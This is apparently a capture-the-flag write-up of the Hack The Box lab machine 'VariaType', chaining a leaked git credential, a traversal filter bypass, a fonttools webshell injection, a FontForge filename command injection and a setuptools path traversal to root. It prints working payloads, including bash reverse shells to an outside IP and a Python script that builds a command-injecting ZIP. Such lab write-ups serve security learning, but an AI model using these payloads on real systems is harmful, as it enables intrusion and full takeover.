---
title: "HTB: VariaType"
date: 2026-04-04
draft: false
categories: ["writeup"]
tags:
  - hackthebox
  - linux
  - medium
  - git-dumper
  - lfi
  - fonttools
  - cve-2025-66034
  - fontforge
  - cve-2024-25081
  - setuptools
  - cve-2025-47273
description: "Medium Linux box exploiting exposed .git credentials, fonttools XML injection for a webshell, FontForge command injection for lateral movement, and setuptools path traversal for root."
summary: "Medium Linux box exploiting exposed .git credentials, fonttools XML injection for a webshell, FontForge command injection for lateral movement, and setuptools path traversal for root."
cover:
  image: "/images/htb-variatype/info-card.png"
  alt: "HTB VariaType"
  relative: false
showToc: true
TocOpen: false
---

| Box | Info |
|---|---|
| OS | Linux |
| Difficulty | Medium |
| Release | 2026 |

### Kill Chain

| Step | Action | Result |
|---|---|---|
| 1 | Nmap + vhost fuzzing | Discover `portal.variatype.htb` |
| 2 | Directory fuzzing | Exposed `.git` repository |
| 3 | Git dump | Recover `gitbot` credentials from commit history |
| 4 | Parameter fuzz + LFI | Read Nginx config, systemd service, Flask app source |
| 5 | CVE-2025-66034 (fonttools) | XML injection in `.designspace` writes PHP webshell |
| 6 | CVE-2024-25081 (FontForge) | Command injection via crafted ZIP filename, shell as `steve` |
| 7 | CVE-2025-47273 (setuptools) | Path traversal in `PackageIndex.download()` writes SSH key to root |

## Recon

### nmap

Starting with a port scan.

```console
$ nmap -p- --min-rate 10000 10.129.244.202
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

Only two ports. A targeted scan for version info:

```console
$ nmap -p 22,80 -sV -sC 10.129.244.202
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u7 (protocol 2.0)
| ssh-hostkey:
|   256 e0:b2:eb:88:e3:6a:dd:4c:db:c1:38:65:46:b5:3a:1e (ECDSA)
|_  256 ee:d2:bb:81:4d:a2:8f:df:1c:50:bc:e1:0e:0a:d1:22 (ED25519)
80/tcp open  http    nginx 1.22.1
|_http-title: Did not follow redirect to http://variatype.htb/
|_http-server-header: nginx/1.22.1
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Nginx redirects to `variatype.htb`. After adding that to `/etc/hosts`, I fuzzed for virtual hosts:

```console
$ ffuf -u http://variatype.htb/ -H "Host: FUZZ.variatype.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fs 169
portal                  [Status: 200, Size: 2494, Words: 445, Lines: 59, Duration: 24ms]
```

`portal.variatype.htb` exists. Added that to `/etc/hosts` too.

### Portal - TCP 80

The portal is a "Typography Integrity & Document Validation Suite" with a login form.

![Portal login page](/images/htb-variatype/portal-login.png)

Not much to do without credentials yet. Directory fuzzing turned up something interesting:

```console
$ gobuster dir -u http://portal.variatype.htb -w /usr/share/seclists/Discovery/Web-Content/common.txt -x php,html,txt,bak -b 403,404 -t 50
/.git                 (Status: 301) [Size: 169] [--> http://portal.variatype.htb/.git/]
/.git/HEAD            (Status: 200) [Size: 23]
/.git/config          (Status: 200) [Size: 143]
/.git/index           (Status: 200) [Size: 137]
/auth.php             (Status: 200) [Size: 0]
/dashboard.php        (Status: 302) [Size: 0] [--> /]
/download.php         (Status: 302) [Size: 0] [--> /]
/files                (Status: 301) [Size: 169] [--> http://portal.variatype.htb/files/]
/index.php            (Status: 200) [Size: 2494]
/view.php             (Status: 302) [Size: 0] [--> /]
```

An exposed `.git` directory. I dumped it with `git-dumper`:

```console
$ git-dumper http://portal.variatype.htb/.git/ ./dumped_repo/
$ cd dumped_repo
$ git log
```

Looking at the commit history, one commit stands out: "fix: add gitbot user for automated validation pipeline". Checking it reveals hardcoded credentials in `auth.php`:

```console
$ git show 753b5f5957f2020480a19bf29a0ebc80267a4a3d
```

![Git commit showing gitbot credentials in auth.php](/images/htb-variatype/git-commit-creds.png)

The credentials `gitbot:G1tB0t_Acc3ss_2025!` were committed directly into the authentication file. I logged into the portal with them.

### Enumerating download.php

After authenticating, I noticed `download.php` from the directory fuzzing results. Visiting it directly just returns "File parameter required."

![download.php asking for a file parameter](/images/htb-variatype/download-php-parameter.png)

I fuzzed for the parameter name:

```console
$ ffuf -u "http://portal.variatype.htb/download.php?FUZZ=test" -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -b "PHPSESSID=cfmuiamc2bqe5mo3msfnk52okd" -fs 24
f                       [Status: 200, Size: 15, Words: 3, Lines: 1, Duration: 23ms]
```

The parameter is `f`. Testing it in Burp Repeater with `?f=test` gives "File not found."

![Burp Repeater testing the download.php f parameter](/images/htb-variatype/burp-lfi-request.png)

A simple `../` gets filtered, but the double-dot bypass `....//` works. This is a classic filter evasion where the app strips `../` once, leaving `../` from the remaining characters.

```http
GET /download.php?f=....//....//....//....//....//etc/passwd HTTP/1.1
Host: portal.variatype.htb
Cookie: PHPSESSID=cfmuiamc2bqe5mo3msfnk52okd
```

```text
root:x:0:0:root:/root:/bin/bash
...[snip]...
steve:x:1000:1000:steve,,,:/home/steve:/bin/bash
```

One user on the box: `steve`. Now I used the LFI to map out the application. First, Nginx config to find the web roots:

```text
# /etc/nginx/sites-enabled/portal.variatype.htb
server {
    listen 80;
    server_name portal.variatype.htb;
    root /var/www/portal.variatype.htb/public;
    index index.php;
    ...[snip]...
}
```

```text
# /etc/nginx/sites-enabled/variatype.htb
server {
    listen 80;
    server_name variatype.htb;
    location / {
        proxy_pass http://127.0.0.1:5000;
        ...[snip]...
    }
}
```

So `variatype.htb` proxies to a Python app on port 5000. I pulled the systemd unit file:

```text
# /etc/systemd/system/variatype.service
[Service]
Type=simple
User=variatype
Group=www-data
WorkingDirectory=/opt/variatype
ExecStart=/usr/bin/python3 app.py
ReadWritePaths=/var/www/portal.variatype.htb/public/files
ReadWritePaths=/opt/variatype
```

Two critical details here: the app runs as `variatype` in the `www-data` group, and it has write access to the portal's `/files/` directory. Since the portal runs PHP, writing a `.php` file there means code execution.

Reading the app source at `/opt/variatype/app.py` confirmed it uses `fonttools` to process uploaded `.designspace` files:

```python
subprocess.run(
    ['fonttools', 'varLib', 'config.designspace'],
    cwd=workdir,
    check=True,
    timeout=30
)
```

We control the `.designspace` input (XML), the app can write to the PHP web root, and anything we write there with a `.php` extension gets executed by Nginx. That's the full chain for a foothold.

## Shell as www-data

### CVE-2025-66034: fonttools .designspace XML injection

The fonttools library processes `.designspace` XML files and can write output to arbitrary paths via the `filename` attribute in `<variable-font>` elements. By injecting PHP code into a `<labelname>` element, the generated font file will contain our payload. Setting the output filename to a path inside the PHP web root gives us a webshell.

First, grab two TTF files to serve as font masters:

```console
$ cp /usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf one.ttf
$ cp /usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf two.ttf
```

Then create the malicious `xpl.designspace`:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<designspace format="5.0">
  <axes>
    <axis tag="wght" name="Weight" minimum="100" maximum="900" default="400">
      <labelname xml:lang="en"><![CDATA[<?php passthru($_REQUEST['x']); ?>]]></labelname>
    </axis>
  </axes>
  <sources>
    <source filename="one.ttf" name="Light">
      <location><dimension name="Weight" xvalue="100"/></location>
    </source>
    <source filename="two.ttf" name="Regular">
      <location><dimension name="Weight" xvalue="400"/></location>
    </source>
  </sources>
  <variable-fonts>
    <variable-font name="MyFont" filename="/var/www/portal.variatype.htb/public/files/glyph-check.php">
      <axis-subsets>
        <axis-subset name="Weight"/>
      </axis-subsets>
    </variable-font>
  </variable-fonts>
</designspace>
```

The key parts: the `<labelname>` CDATA block embeds a PHP webshell into the font metadata, and the `filename` attribute on `<variable-font>` tells fonttools to write the output file into the portal's public files directory as `glyph-check.php`.

I uploaded all three files through the variable font generator at `http://variatype.htb/tools/variable-font-generator/`.

![Uploading the malicious .designspace and font files](/images/htb-variatype/upload-designspace.png)

After the upload processed, the webshell was live at `http://portal.variatype.htb/files/glyph-check.php?x=id`:

![RCE confirmed through the PHP webshell](/images/htb-variatype/webshell-rce.png)

I caught a reverse shell:

```console
$ nc -lvnp 9001
```

Triggered via:

```text
http://portal.variatype.htb/files/glyph-check.php?x=bash+-c+'bash+-i+>%26+/dev/tcp/10.10.15.229/9001+0>%261'
```

![Reverse shell as www-data](/images/htb-variatype/www-data-shell.png)

## Shell as steve

### CVE-2024-25081: FontForge command injection via filename

Poking around the filesystem, I found a backup script at `/opt/process_client_submissions.bak` that reveals a cron job processing font files. It uses FontForge to open files and extract metadata:

```python
font = fontforge.open('$file')
family = getattr(font, 'familyname', 'Unknown')
style = getattr(font, 'fontname', 'Default')
```

The script processes archives with extensions like `.zip`, `.tar`, `.tar.gz` and opens the font files inside them. FontForge versions affected by CVE-2024-25081 are vulnerable to command injection through crafted filenames. When FontForge opens a file, the filename passes through a shell, so a filename containing a command substitution like `$(...)` gets executed.

I wrote a Python script to create a malicious ZIP:

```python
#!/usr/bin/env python3
import base64
import zipfile
from pathlib import Path

attacker_ip = "10.10.15.229"
attacker_port = 9002
font_path = "/usr/share/fonts/truetype/noto/NotoSansLycian-Regular.ttf"

command = f"bash -c 'bash -i >& /dev/tcp/{attacker_ip}/{attacker_port} 0>&1'"
payload = base64.b64encode(command.encode()).decode()
font_data = Path(font_path).read_bytes()

member_name = f"$(echo {payload}|base64 -d|bash).ttf"

with zipfile.ZipFile("exploit.zip", "w", zipfile.ZIP_DEFLATED) as zf:
    zf.writestr(member_name, font_data)

print("[+] exploit.zip created")
```

The ZIP member filename contains a base64-encoded reverse shell command wrapped in `$(...)`. When FontForge tries to open this "font file," the shell expands the filename and executes our payload.

Transferred the ZIP to the target's watched directory:

```console
$ python3 -m http.server
```

```console
$ cd /var/www/portal.variatype.htb/public/files
$ wget http://10.10.15.229:8000/exploit.zip
```

Set up a listener and waited for the cron:

```console
$ nc -lvnp 9002
```

![Shell as steve](/images/htb-variatype/steve-shell.png)

Grabbed the user flag from steve's home:

```console
$ cat user.txt
b2061430************************
```

## Shell as root

### CVE-2025-47273: setuptools PackageIndex path traversal

Checking sudo permissions:

```console
$ sudo -l
User steve may run the following commands on variatype:
    (root) NOPASSWD: /usr/bin/python3 /opt/font-tools/install_validator.py *
```

The script downloads a "plugin" from a URL using `setuptools.package_index.PackageIndex.download()` and saves it to `/opt/font-tools/validators`. It does basic URL validation (must be `http://` or `https://`, no more than 10 slashes), but the real vulnerability isn't in the script's validation. It's in setuptools itself.

CVE-2025-47273 is a path traversal in `PackageIndex.download()`. The method uses the URL path to determine the local filename, and URL-encoded path separators (`%2f`) get decoded after the security checks, allowing writes to arbitrary locations. By crafting a URL with `%2f..%2f` sequences, we can escape the target directory.

The plan: write an SSH public key to `/root/.ssh/authorized_keys`.

Generate a key pair on the attacker:

```console
$ ssh-keygen -t ed25519 -f /tmp/root_key -N ""
```

Set up a simple HTTP server that serves the public key regardless of what path is requested:

```python
from http.server import HTTPServer, BaseHTTPRequestHandler

class Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        with open("/tmp/root_key.pub", "rb") as f:
            data = f.read()
        self.send_response(200)
        self.send_header("Content-Type", "text/plain")
        self.send_header("Content-Length", str(len(data)))
        self.end_headers()
        self.wfile.write(data)

HTTPServer(("0.0.0.0", 80), Handler).serve_forever()
```

The custom server is needed because `PackageIndex.download()` requests the exact URL path we provide. The server ignores the path and always returns the SSH key.

Trigger the path traversal:

```console
$ sudo /usr/bin/python3 /opt/font-tools/install_validator.py "http://10.10.15.229:80/%2f..%2f..%2froot%2f.ssh%2fauthorized_keys"
```

The URL stays under the 10-slash limit because the encoded slashes (`%2f`) aren't counted. After `PackageIndex.download()` decodes them, the file gets written to `/root/.ssh/authorized_keys` instead of the validators directory.

SSH in as root:

```console
$ chmod 600 /tmp/root_key
$ ssh -i /tmp/root_key root@variatype.htb
```

![Root shell via SSH](/images/htb-variatype/root-shell.png)

```console
# cat root.txt
51c36d89************************
```

## Credentials

| User | Password / Hash | Source |
|---|---|---|
| gitbot | G1tB0t_Acc3ss_2025! | Exposed `.git` commit history |
